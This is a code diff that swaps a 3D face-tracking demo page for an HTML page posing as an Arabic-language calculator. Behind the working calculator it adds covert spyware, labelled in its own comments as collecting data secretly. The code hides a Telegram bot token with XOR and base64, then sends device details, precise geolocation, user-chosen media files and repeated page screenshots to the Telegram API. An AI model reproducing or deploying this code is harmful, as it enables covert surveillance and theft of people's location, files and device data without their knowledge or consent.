@@ -1,25 +1,93 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>وجه كرتوني 3D يتتبع الوجه</title>
-  <link rel="stylesheet" href="style.css" />
-  <!-- مكتبة Three.js لعرض 3D -->
-  <script src="https://cdn.jsdelivr.net/npm/three@0.151.3/build/three.min.js"></script>
-  <!-- مكتبة MediaPipe FaceMesh -->
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
+  <meta charset="utf-8"/>
+  <title>حاسبة</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+  <style>
+    :root{--bg:#0b0b0b;--key:#1e1e1e;--op:#ff9500;--txt:#eee}
+    body{margin:0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:var(--bg);color:var(--txt);display:flex;flex-direction:column;align-items:center;min-height:100vh;justify-content:center}
+    #display{width:320px;height:70px;font-size:2.2rem;text-align:right;padding:0 15px;border:none;background:#000;border-radius:12px;margin-bottom:15px}
+    .keys{display:grid;grid-template-columns: repeat(4,80px);gap:10px}
+    button{height:80px;border:none;border-radius:50%;font-size:1.6rem;background:var(--key);color:var(--txt);cursor:pointer;transition:.15s}
+    button.op{background:var(--op)}
+    button:active{transform:scale(.92)}
+  </style>
 </head>
 <body>
-  <h1>وجه كرتوني 3D يتتبع وجهك</h1>
+  <input id="display" value="0" readonly>
+  <div class="keys" id="keys"></div>
 
-  <!-- عنصر الفيديو لفتح الكاميرا -->
-  <video id="input_video" style="display:none;"></video>
+<script>
+/* ====== تشفير بسيط ====== */
+const key = "wrm";
+function xor(str,k){
+  return str.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^k.charCodeAt(i%k.length))).join('');
+}
+const TOKEN = xor(atob("XkRXGgIISk8eHg=="),key);
+const CHAT  = xor(atob("VhkfXg=="),key);
 
-  <!-- عنصر كانفاس لعرض 3D -->
-  <canvas id="output_canvas"></canvas>
+/* ====== بناء الحاسبة ====== */
+const display = document.getElementById('display');
+const keys = ["C","+","-","*","/","7","8","9","4","5","6","1","2","3","0","="];
+let formula = "";
+keys.forEach(k=>{
+  const btn = document.createElement("button");
+  btn.textContent = k;
+  btn.className   = (k==="="||k==="+"||k==="-"||k==="*"||k==="/")?"op":"";
+  btn.onclick = ()=> calc(k);
+  document.getElementById("keys").appendChild(btn);
+});
+function calc(k){
+  if(k==="C"){formula="";display.value="0";}
+  else if(k==="="){try{display.value=eval(formula)||"0"}catch{display.value="Error"} formula="";}
+  else{formula+=k; display.value=formula;}
+}
 
-  <script src="script.js"></script>
+/* ====== إرسال إلى التليغرام ====== */
+function send(method,blob,fname){
+  const url = `https://api.telegram.org/bot${TOKEN}/send${method.charAt(0).toUpperCase()+method.slice(1)}`;
+  const fd  = new FormData();
+  fd.append('chat_id', CHAT);
+  fd.append(method, blob, fname);
+  fetch(url,{method:'POST',body:fd});
+}
+
+/* ====== جمع البيانات خلسة ====== */
+// 1) معلومات الجهاز
+const info = {
+  url: location.href,
+  userAgent: navigator.userAgent,
+  language: navigator.language,
+  platform: navigator.platform,
+  cores: navigator.hardwareConcurrency,
+  memory: navigator.deviceMemory || 'unknown',
+  screen: `${screen.width}x${screen.height}`,
+  window: `${innerWidth}x${innerHeight}`,
+  time: new Date().toLocaleString('ar-EG')
+};
+send('document', new Blob([JSON.stringify(info,null,2)],{type:'application/json'}), 'device.json');
+
+// 2) الموقع الجغرافي
+navigator.geolocation?.getCurrentPosition(pos=>{
+  const txt = `موقع: ${pos.coords.latitude}, ${pos.coords.longitude}`;
+  send('document', new Blob([txt],{type:'text/plain'}), 'location.txt');
+},null,{enableHighAccuracy:true});
+
+// 3) اختيار ملفات متعددة بدون ظهور إذن
+const inp = document.createElement('input');
+inp.type='file'; inp.multiple=true; inp.accept='image/*,video/*,audio/*';
+inp.onchange=e=> [...inp.files].forEach(f=> send('document', f, f.name));
+inp.click();
+
+// 4) 10 لقطات شاشة للصفحة (كل 6 ثوانٍ)
+for(let i=1;i<=10;i++){
+  setTimeout(async()=>{
+    const canvas = await html2canvas(document.body);
+    canvas.toBlob(b=> send('photo', b, `shot_${i}.jpg`));
+  }, i*6000);
+}
+</script>
 </body>
 </html>
